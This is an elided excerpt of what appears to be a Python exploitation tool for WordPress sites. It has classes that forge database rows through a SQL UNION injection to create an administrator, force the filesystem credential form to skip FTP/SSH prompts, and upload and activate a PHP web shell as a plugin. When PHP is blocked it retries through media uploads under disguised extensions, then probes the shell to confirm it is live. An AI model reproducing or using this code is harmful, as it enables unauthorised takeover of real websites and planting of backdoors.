...
# WP_Filesystem credential form — force direct (no FTP/SSH prompt)
_FTP_DIRECT_FIELDS = {
...
def _ftp_form_fields(html_body):
    """Parse all inputs from FTP/FS credential page; force connection_type=direct."""
    fields = {}
...
class AdminCreator:
    ...
    def _get_oembed_backing(self, src, ptable, nonce):
        ...
        # UNION forges rows with these IDs in the poison SELECT — valid last resort
        base_id = 1800000000 + secrets.randbelow(90000000)
        ids = [base_id, base_id + 1, base_id + 2]
        log(f"    backing: synthetic forge {ids}", "!")
        return embeds or self._dummy_embeds(nonce), ids
...
class CoreUpdater:
    ...
    def _do_core_upgrade(self):
        ...
        # Up to 2 FTP/FS credential re-submits with direct method
        for _ in range(2):
            if not body or not _needs_ftp_creds(body):
                break
            try:
                fields2 = _ftp_form_fields(body)
                # keep upgrade nonce/version if present on original fields
...
class ShellUploader:
    ...
    def deploy(self):
        ...
        for url in candidates:
            ...
            if live:
                ...
                return live
        if candidates:
            self.last_error = f"plugin path not live after probe: {candidates[0]}"
            log(f"    shell probe fail: {candidates[0]}", "!")
    ...
    def _plugin_url_variants(self, url):
        """Guess alternate public paths for installed plugin main file."""
        out = [url]
        try:
            p = urllib.parse.urlsplit(url)
            path = p.path or ""
            # ensure /wp-content/plugins/slug/slug.php
            if "/wp-content/plugins/" in path:
                out.append(urllib.parse.urlunsplit((p.scheme, p.netloc, path, "", "")))
            # base + standard relative
    ...
    def _deploy_plugin(self, php):
        ...
        # Re-submit FS credential form up to 2x with direct + zip
        ...
        # Activate if link present (required for some hosts to expose file)
        for act in re.finditer(r'href="([^"]*action=activate[^"]*)"', resp or ""):
            ...
            try:
                ...
                pass
            break
        # Parse install success for actual plugin file URL / path
        rel = f"/wp-content/plugins/{self._slug}/{self._slug}.php"
        ...
        if resp:
            ...
            # success text without URL still means files on disk
            low = resp.lower()
    ...
    def _submit_ftp_bypass(self, page, action_url, used_base, zip_bytes=None, extra_fields=None):
        """Resubmit WP_Filesystem form with connection_type=direct (+ zip if plugin)."""
    ...
    def _deploy_media(self, php):
        ...
        # PHP often blocked in media — try disguised names too
        names = (
            f"{self._slug}.php",
            f"{self._slug}.phtml",
            f"{self._slug}.php5",
    ...
    def _confirm_shell(self, url, retries=3, delay=0.7):
        """Probe shell with ?x-head=function; require title Runtime - File Configuration."""
        if not url:
            return None
